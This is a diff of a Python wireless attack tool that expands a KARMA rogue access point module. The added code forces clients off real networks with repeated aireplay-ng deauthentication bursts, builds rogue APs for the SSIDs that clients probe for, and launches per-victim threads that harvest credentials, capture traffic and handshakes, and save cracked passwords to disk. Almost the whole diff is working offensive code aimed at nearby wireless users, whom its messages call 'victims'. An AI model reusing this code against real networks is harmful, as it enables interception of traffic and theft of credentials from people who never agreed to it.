@@ -3915,23 +5094,35 @@ server=8.8.8.8
                                 if len(parts) >= 3:
                                     mac = parts[1].lower()
                                     connected_macs.add(mac)
-                except (FileNotFoundError, PermissionError, IOError) as e:
-                    if Configuration.verbose > 1:
-                        Color.pl('{!} {R}Error reading DHCP leases file: {O}%s{W}' % str(e))
+                except Exception:
+                    pass
             
-            # Method 3: Check ARP table for clients on our subnet
+            # Method 4: Check network interface statistics
+            try:
+                cmd = ['cat', f'/sys/class/net/{self.rogue_interface}/statistics/rx_packets']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
+                if result.returncode == 0:
+                    rx_packets = int(result.stdout.strip())
+                    if rx_packets > 0:
+                        # Interface is receiving packets, likely has clients
+                        if Configuration.verbose > 1:
+                            Color.pl('{+} {C}Interface receiving packets - clients likely connected{W}')
+            except Exception:
+                pass
+            
+            # Method 5: Check ARP table for clients on our subnet (enhanced)
             try:
                 cmd = ['arp', '-a']
                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                 if result.returncode == 0:
                     for line in result.stdout.split('\n'):
-                        if '10.0.0.' in line and '(' in line and ')' in line:
+                        # Check for various subnet ranges, not just 10.0.0.x
+                        if any(subnet in line for subnet in ['10.0.0.', '192.168.', '172.16.']) and '(' in line and ')' in line:
                             mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                             if mac_match:
                                 connected_macs.add(mac_match.group(1).lower())
-            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
-                if Configuration.verbose > 1:
-                    Color.pl('{!} {R}Error checking ARP table: {O}%s{W}' % str(e))
+            except Exception:
+                pass
             
             return connected_macs
             
@@ -3941,16 +5132,37 @@ server=8.8.8.8
             return set()
     
     def show_connection_status(self):
-        """Show detailed connection status"""
+        """Show detailed connection status with enhanced information"""
         try:
             if len(self.connected_clients) > 0:
-                Color.pl('{+} {G}🎯 KARMA Active - {C}%d{W} clients connected{W}' % len(self.connected_clients))
-                for mac in self.connected_clients:
-                    status = "Handshake captured" if mac in self.captured_handshakes else "Monitoring"
-                    Color.pl('  {G}* {W}%s - {C}%s{W}' % (mac, status))
+                Color.pl('{+} {G}🎯 KARMA Active - {C}%d{W} victim(s) connected{W}' % len(self.connected_clients))
+                Color.pl('{+} {C}' + '-' * 50)
+                for mac in sorted(self.connected_clients):
+                    # Check multiple status indicators
+                    has_handshake = mac in self.captured_handshakes
+                    has_credentials = mac in getattr(self, 'captured_credentials', {})
+                    has_cracked = mac in getattr(self, 'cracked_passwords', {})
+                    
+                    status_parts = []
+                    if has_cracked:
+                        status_parts.append("{G}CRACKED{W}")
+                    if has_credentials:
+                        status_parts.append("{C}Has Credentials{W}")
+                    if has_handshake:
+                        status_parts.append("{G}Handshake{W}")
+                    if not status_parts:
+                        status_parts.append("{O}Monitoring{W}")
+                    
+                    status = " - ".join(status_parts)
+                    Color.pl('  {G}* {W}%s - %s{W}' % (mac, status))
+                Color.pl('{+} {C}' + '-' * 50)
+                Color.pl('{+} {O}Active deauth on {C}%d{W} networks, probing clients: {C}%d{W}{W}' % 
+                        (len(self.real_networks), len(getattr(self, 'client_probes', {}))))
             else:
-                Color.pl('{+} {C}KARMA monitoring - waiting for victims to connect...{W}')
-                Color.pl('{+} {O}Deauth attacks active on {C}%d{W} networks{W}' % len(self.real_networks))
+                Color.pl('{+} {C}⏳ KARMA monitoring - waiting for victims to connect...{W}')
+                Color.pl('{+} {O}Active deauth on {C}%d{W} networks{W}' % len(self.real_networks))
+                Color.pl('{+} {C}Detected probe requests: {G}%d{W} devices actively searching{W}' % 
+                        len(getattr(self, 'client_probes', {})))
                 
         except Exception as e:
             if Configuration.verbose > 1:
@@ -3985,7 +5197,7 @@ server=8.8.8.8
                 Color.pl('{!} {R}Error starting victim management: {O}%s{W}' % str(e))
     
     def kick_clients_from_network(self, target):
-        """Kick clients from a real network to force them to connect to fake AP - AGGRESSIVE APPROACH"""
+        """Kick clients from a real network to force them to connect to fake AP - Enhanced implementation"""
         try:
             if not target.clients:
                 return
@@ -3993,25 +5205,35 @@ server=8.8.8.8
             Color.pl('{+} {C}Kicking clients from {G}%s{W} ({C}%s{W}) to force fake AP connection{W}' % 
                     (target.essid, target.bssid))
             
-            # Use aireplay to send deauth packets - IMMEDIATE AND AGGRESSIVE
+            # Use aireplay to send deauth packets - ENHANCED WITH RETRY MECHANISM
             for client in target.clients:
                 try:
-                    # Send deauth packets to client - MORE PACKETS FOR BETTER EFFECT
-                    deauth_cmd = [
-                        'aireplay-ng',
-                        '-0', '5',  # Increased to 5 packets for better effect
-                        '--ignore-negative-one',
-                        '-a', target.bssid,  # Target AP
-                        '-c', client.station,  # Target client MAC address ✅ FIXED
-                        self.probe_interface
-                    ]
-                    
-                    # Execute immediately without delays - OLD CODE APPROACH
-                    subprocess.run(deauth_cmd, capture_output=True, timeout=3)
-                    
-                    if Configuration.verbose > 1:
-                        Color.pl('{+} {C}Sent deauth to {G}%s{W} from {G}%s{W}' % (client.station, target.essid))
+                    # Enhanced deauth with retry mechanism
+                    success = False
+                    for attempt in range(3):  # Try 3 times
+                        deauth_cmd = [
+                            'aireplay-ng',
+                            '-0', '10',  # Increased to 10 packets for better effect
+                            '--ignore-negative-one',
+                            '-a', target.bssid,  # Target AP
+                            '-c', client.station,  # Target client MAC address
+                            self.probe_interface
+                        ]
                         
+                        result = subprocess.run(deauth_cmd, capture_output=True, timeout=5)
+                        if result.returncode == 0:
+                            success = True
+                            break
+                        else:
+                            time.sleep(1)  # Wait before retry
+                    
+                    if success:
+                        if Configuration.verbose > 1:
+                            Color.pl('{+} {C}Successfully sent deauth to {G}%s{W} from {G}%s{W}' % (client.station, target.essid))
+                    else:
+                        if Configuration.verbose > 1:
+                            Color.pl('{!} {R}Failed to deauth {G}%s{W} after 3 attempts{W}' % client.station)
+                            
                 except Exception as e:
                     if Configuration.verbose > 1:
                         Color.pl('{!} {R}Failed to deauth {G}%s{W}: {O}%s{W}' % (client.station, str(e)))
@@ -4020,6 +5242,231 @@ server=8.8.8.8
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error kicking clients from network: {O}%s{W}' % str(e))
     
+    def monitor_client_connection_attempts_old(self):
+        """Monitor for client connection attempts to our rogue AP (DEPRECATED)"""
+        try:
+            Color.pl('{+} {C}Monitoring for client connection attempts...{W}')
+            
+            # Use airodump to monitor for association requests
+            with Airodump(interface=self.probe_interface,
+                         output_file_prefix='karma_associations',
+                         delete_existing_files=True) as airodump:
+                
+                timer = Timer(60)  # Monitor for 60 seconds
+                while not timer.ended() and self.running:
+                    cap_files = airodump.find_files(endswith='.cap')
+                    if cap_files:
+                        # Check for association requests to our rogue AP
+                        self.check_association_requests(cap_files[0])
+                    
+                    time.sleep(5)
+                    
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error monitoring connection attempts: {O}%s{W}' % str(e))
+
+    def check_association_requests(self, capfile):
+        """Check for association requests to our rogue AP"""
+        try:
+            # Use tshark to find association requests
+            cmd = [
+                'tshark',
+                '-r', capfile,
+                '-Y', 'wlan.fc.type_subtype == 0x00',  # Association request
+                '-T', 'fields',
+                '-e', 'wlan.sa',  # Client MAC
+                '-e', 'wlan.da'   # AP MAC
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if line.strip() and '\t' in line:
+                        parts = line.split('\t')
+                        if len(parts) >= 2:
+                            client_mac = parts[0].strip()
+                            ap_mac = parts[1].strip()
+                            
+                            # Check if this is an association request to our rogue AP
+                            rogue_bssid = self._get_rogue_ap_bssid()
+                            if rogue_bssid and ap_mac.lower() == rogue_bssid.lower():
+                                Color.pl('{+} {G}🎯 Client {C}%s{W} connecting to rogue AP {G}%s{W}{W}' % 
+                                        (client_mac, ap_mac))
+                                
+                                # Add to connected clients
+                                if client_mac not in self.connected_clients:
+                                    self.connected_clients.add(client_mac)
+                                    
+                                    # Start immediate monitoring for this client
+                                    threading.Thread(
+                                        target=self.monitor_new_client,
+                                        args=(client_mac,),
+                                        name=f'monitor_{client_mac.replace(":", "")}'
+                                    ).start()
+                            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error checking association requests: {O}%s{W}' % str(e))
+    
+    def monitor_client_connection_attempts(self):
+        """Enhanced monitoring for client connection attempts to our rogue AP"""
+        try:
+            Color.pl('{+} {C}Enhanced monitoring for client connection attempts...{W}')
+            
+            # Start live monitoring if not already running
+            if not hasattr(self, 'live_monitor_process') or not self.live_monitor_process:
+                self.start_live_monitoring()
+            
+            # Use airodump to monitor for association requests with enhanced detection
+            with Airodump(interface=self.probe_interface,
+                         output_file_prefix='karma_associations',
+                         delete_existing_files=True) as airodump:
+                
+                timer = Timer(300)  # Monitor for 5 minutes
+                last_check_time = time.time()
+                
+                while not timer.ended() and self.running:
+                    cap_files = airodump.find_files(endswith='.cap')
+                    if cap_files:
+                        # Enhanced association request detection
+                        self.check_association_requests_enhanced(cap_files[0])
+                        
+                        # Check for probe requests (potential victims)
+                        self.check_probe_requests_enhanced(cap_files[0])
+                    
+                    # Show progress every 30 seconds
+                    current_time = time.time()
+                    if current_time - last_check_time >= 30:
+                        elapsed = int(current_time - (timer.start_time if hasattr(timer, 'start_time') else current_time))
+                        Color.pl('{+} {C}Monitoring... {G}%d{W}s elapsed, {G}%d{W} clients connected{W}' % 
+                                (elapsed, len(self.connected_clients)))
+                        last_check_time = current_time
+                    
+                    time.sleep(5)
+                    
+        except Exception as e:
+            Color.pl('{!} {R}Error monitoring connection attempts: {O}%s{W}' % str(e))
+    
+    def check_association_requests_enhanced(self, capfile):
+        """Enhanced check for association requests to our rogue AP"""
+        try:
+            # Use tshark to find association requests with more details
+            cmd = [
+                'tshark',
+                '-r', capfile,
+                '-Y', 'wlan.fc.type_subtype == 0x00',  # Association request
+                '-T', 'fields',
+                '-e', 'frame.time',
+                '-e', 'wlan.sa',  # Client MAC
+                '-e', 'wlan.da',  # AP MAC
+                '-e', 'wlan.ssid'  # SSID
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if line.strip() and '\t' in line:
+                        parts = line.split('\t')
+                        if len(parts) >= 4:
+                            timestamp = parts[0]
+                            client_mac = parts[1].strip()
+                            ap_mac = parts[2].strip()
+                            ssid = parts[3].strip() if len(parts) > 3 else 'Unknown'
+                            
+                            # Check if this is an association request to our rogue AP
+                            rogue_bssid = self._get_rogue_ap_bssid()
+                            if rogue_bssid and ap_mac.lower() == rogue_bssid.lower():
+                                Color.pl('{+} {G}🎯 Client {C}%s{W} connecting to rogue AP {G}%s{W} (SSID: {C}%s{W}){W}' % 
+                                        (client_mac, ap_mac, ssid))
+                                
+                                # Add to connected clients
+                                if client_mac not in self.connected_clients:
+                                    self.connected_clients.add(client_mac)
+                                    
+                                    # Start immediate monitoring for this client
+                                    threading.Thread(
+                                        target=self.monitor_new_client,
+                                        args=(client_mac,),
+                                        name=f'monitor_{client_mac.replace(":", "")}'
+                                    ).start()
+                            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error checking association requests: {O}%s{W}' % str(e))
+    
+    def check_probe_requests_enhanced(self, capfile):
+        """Enhanced check for probe requests (potential victims)"""
+        try:
+            # Use tshark to find probe requests with SSID information
+            cmd = [
+                'tshark',
+                '-r', capfile,
+                '-Y', 'wlan.fc.type_subtype == 0x04',  # Probe request
+                '-T', 'fields',
+                '-e', 'frame.time',
+                '-e', 'wlan.sa',  # Client MAC
+                '-e', 'wlan.ssid'  # Requested SSID
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if line.strip() and '\t' in line:
+                        parts = line.split('\t')
+                        if len(parts) >= 3:
+                            timestamp = parts[0]
+                            client_mac = parts[1].strip()
+                            ssid = parts[2].strip()
+                            
+                            if ssid and ssid != '':
+                                # Track client's preferred networks
+                                if client_mac not in self.client_probes:
+                                    self.client_probes[client_mac] = []
+                                
+                                if ssid not in self.client_probes[client_mac]:
+                                    self.client_probes[client_mac].append(ssid)
+                                    Color.pl('{+} {C}📡 Client {G}%s{W} probing for {C}%s{W}' % (client_mac, ssid))
+                                    
+                                    # Check if we can create a rogue AP for this SSID
+                                    if ssid not in [net['essid'] for net in self.rogue_ap_networks]:
+                                        self.add_rogue_ap_network(
+                                            bssid=self._get_rogue_ap_bssid(),
+                                            essid=ssid,
+                                            clients=[client_mac]
+                                        )
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error checking probe requests: {O}%s{W}' % str(e))
+    
+    def monitor_new_client(self, client_mac):
+        """Monitor a newly connected client"""
+        try:
+            Color.pl('{+} {G}🔍 Starting comprehensive monitoring for {C}%s{W}...' % client_mac)
+            
+            # Start credential harvesting
+            threading.Thread(
+                target=self.harvest_credentials_from_client,
+                args=(client_mac,),
+                name=f'harvest_{client_mac.replace(":", "")}'
+            ).start()
+            
+            # Start traffic capture
+            threading.Thread(
+                target=self.capture_client_traffic,
+                args=(client_mac,),
+                name=f'traffic_{client_mac.replace(":", "")}'
+            ).start()
+            
+            # Start handshake capture
+            threading.Thread(
+                target=self.start_async_handshake_capture,
+                args=(client_mac,),
+                name=f'handshake_{client_mac.replace(":", "")}'
+            ).start()
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error monitoring new client: {O}%s{W}' % str(e))
     
     def start_monitoring(self):
         """Start unified monitoring with all attack components"""
@@ -4030,6 +5477,11 @@ server=8.8.8.8
             harvest_thread = threading.Thread(target=self.monitor_credential_harvesting)
             harvest_thread.daemon = True  # Consistent daemon setting
             harvest_thread.start()
+            
+            # Start connection attempt monitoring in background
+            connection_monitor_thread = threading.Thread(target=self.monitor_client_connection_attempts)
+            connection_monitor_thread.daemon = True
+            connection_monitor_thread.start()
             
             # Start victim management
             self.start_victim_management()
@@ -4070,6 +5522,11 @@ server=8.8.8.8
             harvest_thread = threading.Thread(target=self.monitor_credential_harvesting)
             harvest_thread.daemon = True  # Consistent daemon setting
             harvest_thread.start()
+            
+            # Start connection attempt monitoring in background
+            connection_monitor_thread = threading.Thread(target=self.monitor_client_connection_attempts)
+            connection_monitor_thread.daemon = True
+            connection_monitor_thread.start()
             
             # Start victim management
             self.start_victim_management()
@@ -4449,14 +5906,22 @@ server=8.8.8.8
                 except:
                     pass
         
-        # Clean up iptables rules only if DNS spoofing was enabled
-        if hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled:
+        # Clean up iptables rules if DNS spoofing or internet access was enabled
+        if (hasattr(self, 'dns_spoofing_enabled') and self.dns_spoofing_enabled) or getattr(Configuration, 'karma_internet_access', False):
             try:
                 subprocess.run(['iptables', '-F'], capture_output=True)
                 subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
                 Color.pl('{+} {G}Cleaned up iptables rules{W}')
             except:
                 pass
+        
+        # Disable IP forwarding if internet access was enabled
+        if getattr(Configuration, 'karma_internet_access', False):
+            try:
+                subprocess.run(['echo', '0'], stdout=open('/proc/sys/net/ipv4/ip_forward', 'w'), check=True)
+                Color.pl('{+} {G}Disabled IP forwarding{W}')
+            except Exception as e:
+                Color.pl('{!} {O}Warning: Failed to disable IP forwarding: {R}%s{W}' % str(e))
         
         # Clean up temporary files
         try:
@@ -4523,6 +5988,21 @@ server=8.8.8.8
                 Color.pl('{+} {G}Killed dnsmasq processes{W}')
             except Exception as e:
                 Color.pl('{!} {O}Warning: Failed to kill dnsmasq: {R}%s{W}' % str(e))
+
+        # Kill web server if credential harvesting was enabled
+        if hasattr(self, 'web_server_process') and self.web_server_process:
+            try:
+                self.web_server_process.terminate()
+                self.web_server_process.wait(timeout=5)
+                Color.pl('{+} {G}Stopped credential harvesting web server{W}')
+            except Exception as e:
+                Color.pl('{!} {O}Warning: Failed to stop web server: {R}%s{W}' % str(e))
+        
+        # Also kill any remaining python http.server processes
+        try:
+            subprocess.run(['pkill', '-f', 'python.*http.server'], capture_output=True)
+        except Exception:
+            pass
 
         # Kill any remaining attack processes
         try:
@@ -4764,6 +6244,237 @@ server=8.8.8.8
         except Exception as e:
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error showing results: {O}%s{W}' % str(e))
+    
+    def get_karma_status(self):
+        """Get KARMA status for GUI - returns dict with all status information"""
+        try:
+            status = {
+                'connected_clients': list(self.connected_clients) if self.connected_clients else [],
+                'connected_count': len(self.connected_clients),
+                'handshakes_captured': len(self.captured_handshakes),
+                'passwords_cracked': len(self.cracked_passwords),
+                'credentials_harvested': len(self.harvested_credentials),
+                'pnl_networks': len(self.pnl_networks),
+                'client_details': []
+            }
+            
+            # Add detailed client information
+            for client_mac in self.connected_clients:
+                client_info = {
+                    'mac': client_mac,
+                    'has_handshake': client_mac in self.captured_handshakes,
+                    'password_cracked': client_mac in self.cracked_passwords,
+                    'has_credentials': client_mac in self.harvested_credentials,
+                    'probe_ssids': self.client_probes.get(client_mac, [])
+                }
+                
+                # Add password if cracked
+                if client_mac in self.cracked_passwords:
+                    client_info['password'] = self.cracked_passwords[client_mac]
+                
+                # Add credential count
+                if client_mac in self.harvested_credentials:
+                    client_info['credential_count'] = len(self.harvested_credentials[client_mac])
+                
+                status['client_details'].append(client_info)
+            
+            return status
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error getting KARMA status: {O}%s{W}' % str(e))
+            return {
+                'connected_clients': [],
+                'connected_count': 0,
+                'handshakes_captured': 0,
+                'passwords_cracked': 0,
+                'credentials_harvested': 0,
+                'pnl_networks': 0,
+                'client_details': []
+            }
+
+    def create_karma_directories(self):
+        """Create KARMA capture directories with proper permissions"""
+        directories = [
+            Configuration.karma_captures_dir,
+            Configuration.karma_probes_dir,
+            Configuration.karma_handshakes_dir,
+            Configuration.karma_credentials_dir,
+            Configuration.karma_traffic_dir
+        ]
+        
+        for directory in directories:
+            try:
+                os.makedirs(directory, exist_ok=True)
+                
+                # Set proper permissions (readable/writable by owner, readable by group/others)
+                os.chmod(directory, 0o755)
+                
+                if Configuration.verbose > 1:
+                    Color.pl('{+} {C}Created directory: {G}%s{W}' % directory)
+            except Exception as e:
+                Color.pl('{!} {R}Error creating directory %s: {O}%s{W}' % (directory, str(e)))
+
+    def wait_for_file_accessibility(self, filepath, max_wait=10):
+        """Wait for a file to become accessible (not locked by another process)"""
+        wait_time = 0
+        while wait_time < max_wait:
+            try:
+                # Check if file exists and is readable
+                if os.path.exists(filepath) and os.access(filepath, os.R_OK):
+                    # Try to open the file to ensure it's not locked
+                    with open(filepath, 'rb') as f:
+                        f.read(1)  # Try to read one byte
+                    return True
+                else:
+                    time.sleep(0.5)
+                    wait_time += 0.5
+            except (IOError, OSError):
+                time.sleep(0.5)
+                wait_time += 0.5
+        
+        return False
+
+    def save_probe_captures(self, capfile):
+        """Save probe capture files to permanent directory"""
+        try:
+            # Create probes directory
+            probes_dir = Configuration.karma_probes_dir
+            if not os.path.exists(probes_dir):
+                os.makedirs(probes_dir, exist_ok=True)
+            
+            # Generate filename with timestamp
+            timestamp = time.strftime('%Y%m%d_%H%M%S')
+            filename = f'karma_probes_{timestamp}.cap'
+            save_path = os.path.join(probes_dir, filename)
+            
+            # Copy file
+            import shutil
+            shutil.copy2(capfile, save_path)
+            
+            Color.pl('{+} {G}Probe captures saved to: {C}%s{W}' % save_path)
+            return save_path
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error saving probe captures: {O}%s{W}' % str(e))
+            return None
+
+    def save_karma_handshake(self, handshake_file, client_mac, ap_bssid):
+        """Save KARMA handshake to permanent directory"""
+        try:
+            # Create handshakes directory
+            handshakes_dir = Configuration.karma_handshakes_dir
+            if not os.path.exists(handshakes_dir):
+                os.makedirs(handshakes_dir, exist_ok=True)
+            
+            # Generate filename
+            timestamp = time.strftime('%Y%m%d_%H%M%S')
+            client_safe = client_mac.replace(':', '-')
+            bssid_safe = ap_bssid.replace(':', '-')
+            filename = f'karma_handshake_{client_safe}_{bssid_safe}_{timestamp}.cap'
+            save_path = os.path.join(handshakes_dir, filename)
+            
+            # Wait for file to be fully written and accessible
+            if not self.wait_for_file_accessibility(handshake_file, max_wait=10):
+                Color.pl('{!} {R}Warning: Handshake file may still be locked, attempting copy anyway{W}')
+            
+            # Copy file with proper error handling
+            import shutil
+            try:
+                shutil.copy2(handshake_file, save_path)
+                
+                # Verify the copied file is accessible
+                if os.path.exists(save_path) and os.access(save_path, os.R_OK):
+                    file_size = os.path.getsize(save_path)
+                    Color.pl('{+} {G}KARMA handshake saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
+                    return save_path
+                else:
+                    Color.pl('{!} {R}Error: Copied handshake file is not accessible{W}')
+                    return None
+                    
+            except Exception as copy_error:
+                Color.pl('{!} {R}Error copying handshake file: {O}%s{W}' % str(copy_error))
+                return None
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error saving KARMA handshake: {O}%s{W}' % str(e))
+            return None
+
+    def save_credential_data(self, capfile, client_mac, credentials):
+        """Save credential harvest data to permanent directory"""
+        try:
+            # Create credentials directory
+            creds_dir = Configuration.karma_credentials_dir
+            if not os.path.exists(creds_dir):
+                os.makedirs(creds_dir, exist_ok=True)
+            
+            # Generate filename
+            timestamp = time.strftime('%Y%m%d_%H%M%S')
+            client_safe = client_mac.replace(':', '-')
+            filename = f'karma_credentials_{client_safe}_{timestamp}.cap'
+            save_path = os.path.join(creds_dir, filename)
+            
+            # Copy PCAP file
+            import shutil
+            shutil.copy2(capfile, save_path)
+            
+            # Save credentials to text file
+            creds_file = save_path.replace('.cap', '_credentials.txt')
+            with open(creds_file, 'w') as f:
+                f.write(f"KARMA Credential Harvest - {timestamp}\n")
+                f.write(f"Client MAC: {client_mac}\n")
+                f.write(f"PCAP File: {filename}\n\n")
+                f.write("Credentials Found:\n")
+                for cred in credentials:
+                    f.write(f"- {cred}\n")
+            
+            Color.pl('{+} {G}Credential data saved to: {C}%s{W}' % save_path)
+            Color.pl('{+} {G}Credentials list saved to: {C}%s{W}' % creds_file)
+            return save_path
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error saving credential data: {O}%s{W}' % str(e))
+            return None
+
+    def save_traffic_capture(self, capfile, client_mac):
+        """Save client traffic capture to permanent directory"""
+        try:
+            # Create traffic directory
+            traffic_dir = Configuration.karma_traffic_dir
+            if not os.path.exists(traffic_dir):
+                os.makedirs(traffic_dir, exist_ok=True)
+            
+            # Generate filename
+            timestamp = time.strftime('%Y%m%d_%H%M%S')
+            client_safe = client_mac.replace(':', '-')
+            filename = f'karma_traffic_{client_safe}_{timestamp}.cap'
+            save_path = os.path.join(traffic_dir, filename)
+            
+            # Wait for file to be fully written and accessible
+            if not self.wait_for_file_accessibility(capfile, max_wait=10):
+                Color.pl('{!} {R}Warning: PCAP file may still be locked, attempting copy anyway{W}')
+            
+            # Copy file with proper error handling
+            import shutil
+            try:
+                shutil.copy2(capfile, save_path)
+                
+                # Verify the copied file is accessible
+                if os.path.exists(save_path) and os.access(save_path, os.R_OK):
+                    file_size = os.path.getsize(save_path)
+                    Color.pl('{+} {G}Traffic capture saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
+                    return save_path
+                else:
+                    Color.pl('{!} {R}Error: Copied file is not accessible{W}')
+                    return None
+                    
+            except Exception as copy_error:
+                Color.pl('{!} {R}Error copying PCAP file: {O}%s{W}' % str(copy_error))
+                return None
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error saving traffic capture: {O}%s{W}' % str(e))
+            return None
 
     @staticmethod
     def can_attack_karma():
